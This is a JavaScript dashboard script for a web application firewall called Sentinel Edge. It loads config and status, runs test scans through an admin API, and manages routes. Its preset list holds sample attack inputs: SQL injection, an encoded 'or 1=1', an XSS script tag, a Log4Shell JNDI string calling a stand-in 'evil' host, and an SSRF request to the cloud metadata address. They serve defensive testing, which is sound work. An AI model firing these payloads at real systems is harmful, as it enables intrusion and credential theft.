// ============================================================================
// dash.mjs — logika dashboard Sentinel Edge WAF.
// Dimuat oleh dashboard-edge.html. Memanggil admin API middleware:
//   GET  /__waf/config   GET /__waf/status   POST /__waf/scan
// Semua endpoint butuh token (query ?token= atau header x-sentinel-token).
// ============================================================================
const $ = (id) => document.getElementById(id);
const token = () => ($("token").value || "sentin-demo");

function apiUrl(path) {
  const sep = path.includes("?") ? "&" : "?";
  return path + sep + "token=" + encodeURIComponent(token());
}
function esc(s) {
  return String(s).replace(/[&<>"']/g, (c) =>
    ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" }[c]));
}

const PRESETS = {
  "SQLi union select": { m: "GET",  path: "/search?q=union select password", ua: "curl/8", b: "" },
  "Double-encoded quote": { m: "POST", path: "/login", ua: "Mozilla", b: "user=%2527%20or%201=1" },
  "XSS":             { m: "GET",  path: "/?q=<script>alert(1)</script>", ua: "Mozilla", b: "" },
  "Log4Shell":       { m: "POST", path: "/api", ua: "curl", b: "Authorization=Basic ${jndi:ldap://evil}" },
  "SSRF metadata":   { m: "GET",  path: "/fetch?url=http://169.254.169.254/latest", ua: "curl", b: "" },
  "Normal (sehat)":  { m: "GET",  path: "/home?tab=promo", ua: "Mozilla/5.0", b: "" },
};

function fillPreset(x) {
  $("pMethod").value = x.m;
  $("pPath").value   = x.path;
  $("pUa").value     = x.ua || "";
  $("pBody").value   = x.b  || "";
}

function renderPresets() {
  const el = $("presets");
  el.innerHTML = "";
  for (const [label, x] of Object.entries(PRESETS)) {
    const b = document.createElement("button");
    b.className = "text-xs px-3 py-1 rounded-lg bg-white/5 border border-white/10 hover:border-[#22ccd6]/60 transition";
    b.textContent = label;
    b.onclick = () => fillPreset(x);
    el.appendChild(b);
  }
}

async function refreshConfig() {
  try {
    const r = await fetch(apiUrl("__waf/config"));
    if (!r.ok) throw new Error(String(r.status));
    const c = await r.json();
    $("cfg").innerHTML =
      `<span class="text-[#22ccd6]">#</span> algorithm <code>${esc(c.algorithm)}</code>` +
      `<br><span class="text-[#22ccd6]">#</span> threshold <code>${c.defaultThreshold}</code>` +
      ` · encoding <code>+${c.scoreTable.ENCODING}</code>` +
      ` · keyword <code>+${c.scoreTable.HIGH}</code>` +
      ` · critical <code>+${c.scoreTable.CRITICAL}</code>` +
      `<br><span class="text-[#22ccd6]">#</span> rate-limit <code>${c.rateLimit.limit} req/${Math.round(c.rateLimit.windowMs / 1000)}s</code>` +
      `<br><span class="text-[#22ccd6]">#</span> bypass <code>${c.bypass.map((x) => esc(x)).join(", ")}</code>`;
  } catch (e) {
    $("cfg").textContent = "gagal ambil config (" + e + ")";
  }
}

async function refreshStatus() {
  try {
    const r = await fetch(apiUrl("__waf/status"));
    const s = await r.json();
    const n = (s.rate && s.rate.entries ? s.rate.entries.length : 0);
    $("rate").innerHTML =
      `<span class="text-[#22ccd6]">#</span> limit <code>${s.rate ? s.rate.limit : "-"}/` +
      `${s.rate ? Math.round(s.rate.windowMs / 1000) : "-"}s</code>` +
      ` · bucket <code>${n}</code>` +
      `<br><span class="text-[#22ccd6]">#</span> IP kini <code>${esc(s.ip)}</code>` +
      `<br><span class="opacity-60">${esc(s.statelessNote || "")}</span>`;
  } catch { $("rate").textContent = "–"; }
}

async function doScan() {
  const payload = {
    method: $("pMethod").value,
    path: $("pPath").value,
    userAgent: $("pUa").value,
    body: $("pBody").value,
  };
  const res = await fetch(apiUrl("__waf/scan"), {
    method: "POST",
    body: JSON.stringify(payload),
  });
  const d = await res.json();
  const block = d.verdict === "BLOCK";
  const color = block ? "var(--red)" : "var(--cyan)";
  const matchHtml = (d.matches || []).map((m) =>
    `<div class="mt-1 text-xs text-[var(--muted)]">${esc(m.category)}.<code>${esc(m.name)}</code> <span class="opacity-60">+${m.score}</span></div>`).join("");
  $("scanResult").innerHTML =
    `<div class="rounded-xl border px-4 py-3" style="border-color:${block ? "rgba(239,91,91,.4)" : "rgba(44,232,209,.4)"};background:rgba(255,255,255,.02)">` +
    `<div class="flex items-center gap-3"><span class="font-mono text-sm font-semibold" style="color:${color}">${block ? "BLOCK" : "PASS"}</span>` +
    `<span class="text-xs text-[var(--muted)]">score <code>${d.score}</code> / threshold <code>${d.threshold}</code></span></div>` +
    (matchHtml || `<div class="mt-1 text-xs text-[var(--muted)]">tidak ada match</div>`) +
    `</div>`;
}

// init
$("scanBtn").onclick = doScan;
renderPresets();

// ---------- LOGIN GATE -------------------------------------------------------
const LS_KEY = "sentinelToken";
function showErr(msg) { const el = $("loginErr"); el.textContent = msg; el.style.display = "block"; }

async function tryLogin(tok) {
  $("token").value = tok;
  try {
    const r = await fetch(apiUrl("__waf/config"));
    if (!r.ok) throw new Error(r.status);
    localStorage.setItem(LS_KEY, tok);
    $("loginGate").style.display = "none";
    refreshConfig(); refreshStatus(); refreshRoutes();
    return true;
  } catch {
    showErr("token salah / tidak terautorisasi");
    return false;
  }
}

$("loginForm").addEventListener("submit", (e) => {
  e.preventDefault();
  const tok = $("loginToken").value.trim();
  if (!tok) return showErr("isi token dulu");
  tryLogin(tok);
});

// auto-login bila ada token tersimpan
(async () => {
  const saved = localStorage.getItem(LS_KEY);
  if (saved && !(await tryLogin(saved))) localStorage.removeItem(LS_KEY);
})();

// ---------- ROUTES CRUD ------------------------------------------------------
async function refreshRoutes() {
  try {
    const r = await fetch(apiUrl("__waf/routes"));
    const d = await r.json();
    $("rtStorage").textContent = "# storage: " + (d.storage || "?") +
      (d.storage === "memory" ? "  (⚠ tidak persisten — hubungkan Upstash Redis di Vercel Marketplace)" : "");
    const list = $("routesList");
    const entries = Object.entries(d.routes || {});
    if (!entries.length) {
      list.innerHTML = `<p class="text-xs text-[var(--muted)]">belum ada route — semua request diteruskan ke routing default (404 bila tanpa app)</p>`;
      return;
    }
    list.innerHTML = entries.map(([prefix, dest]) =>
      `<div class="flex items-center justify-between rounded-lg border border-white/10 bg-white/5 px-3 py-2">
         <div class="font-mono text-xs truncate"><span class="text-[#22ccd6]">${esc(prefix)}</span> → ${esc(dest)}</div>
         <button data-prefix="${esc(prefix)}" class="rtDel text-xs px-2 py-1 rounded-lg border border-white/10 hover:border-[var(--red)]" style="color:var(--red)">hapus</button>
       </div>`).join("");
    for (const btn of list.querySelectorAll(".rtDel")) {
      btn.onclick = () => delRoute(btn.dataset.prefix);
    }
  } catch (e) {
    $("rtStorage").textContent = "gagal ambil routes (" + e + ")";
  }
}

$("rtRefresh").onclick = refreshRoutes;

$("routeForm").addEventListener("submit", async (e) => {
  e.preventDefault();
  const err = $("rtErr"); err.style.display = "none";
  const prefix = $("rtPrefix").value.trim();
  const destination = $("rtDest").value.trim();
  const res = await fetch(apiUrl("__waf/routes"), {
    method: "POST", body: JSON.stringify({ prefix, destination }),
  });
  const d = await res.json();
  if (!res.ok) { err.textContent = d.error || "gagal"; err.style.display = "block"; return; }
  $("rtPrefix").value = ""; $("rtDest").value = "";
  refreshRoutes();
});

async function delRoute(prefix) {
  await fetch(apiUrl("__waf/routes") + "&prefix=" + encodeURIComponent(prefix), { method: "DELETE" });
  refreshRoutes();
}

refreshConfig();
refreshStatus();
setInterval(refreshStatus, 5000);